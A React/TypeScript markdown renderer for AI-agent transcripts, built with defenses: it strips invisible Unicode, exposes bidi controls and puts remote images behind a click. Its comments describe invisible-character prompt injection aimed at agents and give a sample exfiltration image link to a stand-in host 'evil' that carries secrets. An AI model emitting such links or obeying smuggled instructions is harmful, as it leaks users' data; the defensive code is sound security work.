import ReactMarkdown from "react-markdown";
import type { Components } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import { useState, memo } from "react";
import { useWatchEffect } from "../../hooks/useWatchEffect";
import { useImageGallery } from "../ImageGallery";
import { CodeBlock } from "../CodeBlock";
import { MermaidDiagram } from "../MermaidDiagram";
import { tryRenderCanvas, tryRenderHtmlMessage } from "../HtmlSnippet";
import { tryRenderCastDiff } from "../InlineDiff";
import { entityRemarkPlugins } from "../../lib/remarkEntityIds";
import { EntityAwareCode, EntityAwareLink } from "../EntityIdPill";

function extractTextFromHast(node: any): string {
  if (!node) return '';
  if (node.type === 'text') return node.value || '';
  if (node.children) return node.children.map(extractTextFromHast).join('');
  return '';
}

// ---------------------------------------------------------------------------
// Security control: neutralize invisible Unicode in rendered transcript text.
//
// Transcripts echo attacker-influenceable text verbatim (anything the agent
// read from a repo, the web, an issue, or an MCP tool). Zero-width and
// Private-Use-Area codepoints carry no visible glyph, so an attacker uses them
// to smuggle instructions a human reviewer literally cannot see (the
// invisible-Unicode / "IDEsaster" injection class). Bidirectional overrides go
// further: they reorder the *visual* run so reviewed text reads differently
// than the underlying bytes (the "trojan source" trick).
//
// Zero-width joiners/spaces (U+200B-U+200D), the BOM (U+FEFF), and every
// Private Use Area codepoint get stripped outright — they have no legitimate
// role in prose. Bidi controls (U+202A-U+202E, U+2066-U+2069) are NOT dropped
// (that would silently hide the tampering); each is surfaced as its visible
// codepoint so a reviewer sees that reordering was attempted.
const INVISIBLE_STRIP_RE =
  /[\u200B-\u200D\uFEFF\uE000-\uF8FF]|[\u{F0000}-\u{FFFFD}]|[\u{100000}-\u{10FFFD}]/gu;
const BIDI_CONTROL_RE = /[\u202A-\u202E\u2066-\u2069]/g;

function sanitizeInvisibleUnicode(value: string): string {
  if (!value) return value;
  return value
    .replace(INVISIBLE_STRIP_RE, '')
    .replace(BIDI_CONTROL_RE, (ch) =>
      `[U+${ch.codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}]`,
    );
}

// Remark transform that cleans invisible Unicode from prose `text` nodes only.
// Fenced/inline code lives in `code`/`inlineCode` mdast nodes (a different node
// type that never reaches this walk), so verbatim code stays byte-exact —
// rewriting bytes inside a code block could corrupt legitimate source, and
// flagging there is deliberately out of scope.
function remarkSanitizeInvisibleUnicode() {
  return (tree: any) => {
    const walk = (node: any) => {
      if (!node) return;
      if (node.type === 'text' && typeof node.value === 'string') {
        node.value = sanitizeInvisibleUnicode(node.value);
      }
      if (Array.isArray(node.children)) node.children.forEach(walk);
    };
    walk(tree);
  };
}

// ---------------------------------------------------------------------------
// Security control: never auto-fetch remote images in a rendered transcript.
//
// A markdown image auto-loads the instant it renders: the browser GETs the src
// with no click. That is a silent exfiltration channel — an attacker who gets
// the agent to emit ![x](https://evil/px?c=<secret>) (one signed pixel per
// secret character) beacons data out to teammates and to public share-link
// visitors with zero interaction (the EchoLeak / CamoLeak class).
//
// Local paths, data:/blob: URIs, and our own Convex storage host (where
// legitimate pasted/uploaded transcript images live, served via getImageUrl)
// reach no third party, so they render immediately. Every other http(s) origin
// is held behind an explicit click-to-load.
const TRUSTED_IMAGE_ORIGINS: Set<string> = (() => {
  const origins = new Set<string>();
  try { origins.add(window.location.origin); } catch { /* non-browser */ }
  try {
    const convexUrl = import.meta.env.VITE_CONVEX_URL;
    if (convexUrl) origins.add(new URL(convexUrl).origin);
  } catch { /* malformed/unset env */ }
  return origins;
})();

function isRemoteImageSrc(src: string): boolean {
  // Inline data / local object URLs never touch a third party.
  if (/^(data:|blob:)/i.test(src)) return false;
  // Relative or root-relative path — resolves against our own origin. A
  // protocol-relative "//host/…" has no scheme but IS remote, so let it fall
  // through to URL parsing below.
  if (!/^[a-z][a-z0-9+.-]*:/i.test(src) && !src.startsWith('//')) return false;
  try {
    const url = new URL(src, window.location.href);
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return false;
    return !TRUSTED_IMAGE_ORIGINS.has(url.origin);
  } catch {
    return true; // unparseable absolute reference → treat as untrusted
  }
}

interface MarkdownRendererProps {
  content: string;
  filePath?: string;
  className?: string;
}

export function isMarkdownFile(filePath: string): boolean {
  const ext = filePath.split('.').pop()?.toLowerCase();
  return ext === 'md' || ext === 'mdx';
}

export function isPlanFile(filePath: string, content: string): boolean {
  const fileName = filePath.split('/').pop()?.toLowerCase() || '';
  if (fileName.includes('plan') || fileName === 'plan.md') {
    return true;
  }
  if (filePath.includes('.claude/plans/')) {
    return true;
  }
  const planPatterns = [
    /^#\s*(implementation\s+)?plan/im,
    /^##\s*(goals?|objectives?|overview)/im,
    /^##\s*(steps?|phases?|tasks?|approach)/im,
    /^\d+\.\s+\*\*[^*]+\*\*/m,
    /^-\s+\[[ x]\]/im,
  ];
  let matches = 0;
  for (const pattern of planPatterns) {
    if (pattern.test(content)) {
      matches++;
      if (matches >= 2) return true;
    }
  }
  return false;
}

const MD_IMAGE_COLLAPSED_HEIGHT = 100;

export function CollapsibleImage({ src: rawSrc, alt }: { src?: string | Blob; alt?: string }) {
  const src = typeof rawSrc === 'string' ? rawSrc : undefined;
  const [loaded, setLoaded] = useState(false);
  const [errored, setErrored] = useState(false);
  // User opt-in for a remote image: nothing hits the network until the click.
  const [revealed, setRevealed] = useState(false);
  const gallery = useImageGallery();

  // A remote http(s) image that the viewer hasn't opted into. Until then we
  // render neither the <img> nor a gallery registration, so the browser issues
  // no request for it (the auto-fetch exfiltration channel stays closed).
  const blocked = !!src && !revealed && isRemoteImageSrc(src);

  useWatchEffect(() => {
    if (src && gallery && !blocked) gallery.register(src);
  }, [src, gallery, blocked]);

  if (!src || errored) return null;

  if (blocked) {
    return (
      <span
        className="my-2 flex max-w-md flex-col gap-1.5 rounded border border-dashed border-sol-border bg-sol-bg-alt p-3 text-xs"
        onClick={(e) => { e.stopPropagation(); setRevealed(true); }}
        role="button"
        tabIndex={0}
        title="This image is served from a third party. Loading it would let that server see your IP and the click. Only load it if you trust the source."
      >
        <span className="font-medium text-sol-text-muted">Remote image not loaded</span>
        <span className="break-all text-sol-text-dim">{src}</span>
        <span className="text-sol-blue">Click to load image</span>
      </span>
    );
  }

  return (
    <span
      className="my-2 block cursor-pointer relative max-w-md"
      style={{ minHeight: MD_IMAGE_COLLAPSED_HEIGHT }}
      onClick={() => gallery?.open(src)}
    >
      {!loaded && (
        <span className="absolute inset-0 block rounded-t border-x border-t border-sol-border bg-sol-bg-alt flex items-center justify-center z-10" style={{ height: MD_IMAGE_COLLAPSED_HEIGHT }}>
          <span className="text-sol-text-dim text-xs">Loading image...</span>
        </span>
      )}
      <span
        className="block overflow-hidden rounded-t border-x border-t border-sol-border hover:border-sol-blue/50 transition-all"
        style={{ height: MD_IMAGE_COLLAPSED_HEIGHT }}
      >
        <img
          src={src}
          alt={alt || "Image"}
          className="w-full"
          style={loaded ? undefined : { width: 0, height: 0, overflow: 'hidden', position: 'absolute' }}
          onLoad={() => setLoaded(true)}
          onError={() => setErrored(true)}
        />
      </span>
      {loaded && (
        <span
          className="absolute bottom-0 left-0 right-0 h-20 pointer-events-none block"
          style={{ background: 'linear-gradient(to bottom, transparent, var(--image-fade-bg, var(--sol-bg, #0a0a0a)))' }}
        />
      )}
    </span>
  );
}

// Hoisted to module scope so ReactMarkdown receives stable plugin/component
// identities on every render. Inline literals here meant react-markdown re-ran
// the full parse + rehype-highlight syntax pass on EVERY parent re-render — the
// single largest hot path during a session switch (measured: ~4.2s of self time,
// 775 renders). None of these component overrides close over props, so they're
// genuinely static.
const MD_REHYPE_PLUGINS = [rehypeHighlight];
// Runs after entity-id/mention rewriting so it cleans every prose text node,
// including those inside generated pills. Module scope keeps the identity
// stable, matching the perf note above.
const MD_REMARK_PLUGINS = [...entityRemarkPlugins, remarkSanitizeInvisibleUnicode];
const MD_COMPONENTS: Components = {
          code: EntityAwareCode,
          a: EntityAwareLink,
          pre: ({ node, children, ...props }) => {
            const codeElement = node?.children?.[0];
            if (codeElement && codeElement.type === 'element' && codeElement.tagName === 'code') {
              const className = codeElement.properties?.className as string[] | undefined;
              const language = className?.find((cls) => cls.startsWith('language-'))?.replace('language-', '');
              const code = extractTextFromHast(codeElement);
              if (code) {
                if (language === 'mermaid') return <MermaidDiagram code={code} />;
                const canvas = tryRenderCanvas(language, code);
                if (canvas) return canvas;
                const castDiff = tryRenderCastDiff(language, code);
                if (castDiff) return castDiff;
                return <CodeBlock code={code} language={language} />;
              }
            }
            return <pre {...props}>{children}</pre>;
          },
          h1: ({ children }) => (
            <h1 className="text-lg font-bold mt-0 mb-3 text-sol-text">
              {children}
            </h1>
          ),
          h2: ({ children }) => (
            <h2 className="text-base font-semibold mt-4 mb-2 text-sol-text">
              {children}
            </h2>
          ),
          h3: ({ children }) => (
            <h3 className="text-sm font-semibold mt-3 mb-1 text-sol-text-muted">
              {children}
            </h3>
          ),
          ul: ({ children }) => (
            <ul className="my-2 space-y-1 list-disc list-inside">{children}</ul>
          ),
          ol: ({ children }) => (
            <ol className="my-2 space-y-1 list-decimal list-inside">{children}</ol>
          ),
          li: ({ children }) => {
            const text = String(children);
            const isCheckbox = text.startsWith('[ ]') || text.startsWith('[x]') || text.startsWith('[X]');
            if (isCheckbox) {
              const checked = text.startsWith('[x]') || text.startsWith('[X]');
              const label = text.slice(3).trim();
              return (
                <li className="flex items-start gap-2 list-none -ml-4">
                  <span className={`mt-0.5 ${checked ? 'text-emerald-400' : 'text-sol-text-dim'}`}>
                    {checked ? '✓' : '○'}
                  </span>
                  <span className={checked ? 'text-sol-text-muted line-through' : ''}>{label}</span>
                </li>
              );
            }
            return <li className="text-sol-text-secondary">{children}</li>;
          },
          strong: ({ children }) => (
            <strong className="font-semibold">{children}</strong>
          ),
          blockquote: ({ children }) => (
            <blockquote className="border-l-2 border-sol-border pl-3 my-2 text-sol-text-muted italic">
              {children}
            </blockquote>
          ),
          table: ({ children }) => (
            <div className="overflow-x-auto my-3">
              <table className="min-w-full text-xs border-collapse border border-sol-border/50">
                {children}
              </table>
            </div>
          ),
          th: ({ children }) => (
            <th className="border border-sol-border/50 px-2 py-1 bg-sol-bg-highlight text-left font-semibold">
              {children}
            </th>
          ),
          td: ({ children }) => (
            <td className="border border-sol-border/50 px-2 py-1">{children}</td>
          ),
          img: ({ src, alt }) => <CollapsibleImage src={src} alt={alt} />,
};

// memo: props are all primitives (content/filePath/className), so this skips the
// expensive markdown parse + syntax-highlight whenever the content value is
// unchanged — even if the parent message block re-renders.
// The markdown body WITHOUT the wrapping prose div, so each parsed block (h1, p,
// ul, …) is a direct sibling element. Callers that need to measure or annotate
// individual blocks (e.g. the quote/comment review rail) render this so the
// blocks become direct children of their own container; everyone else uses
// MarkdownRenderer, which wraps these in the prose container.
export const MarkdownBlocks = memo(function MarkdownBlocks({ content }: { content: string }) {
  // An all-HTML body renders as a sanitized canvas — the markdown pipeline
  // escapes raw tags into garbled source.
  const html = tryRenderHtmlMessage(content);
  if (html) return html;
  return (
    <ReactMarkdown
      remarkPlugins={MD_REMARK_PLUGINS}
      rehypePlugins={MD_REHYPE_PLUGINS}
      components={MD_COMPONENTS}
    >
      {content}
    </ReactMarkdown>
  );
});

export const MarkdownRenderer = memo(function MarkdownRenderer({ content, filePath = '', className = '' }: MarkdownRendererProps) {
  return (
    <div className={`prose prose-invert prose-sm max-w-none ${className}`}>
      <MarkdownBlocks content={content} />
    </div>
  );
});
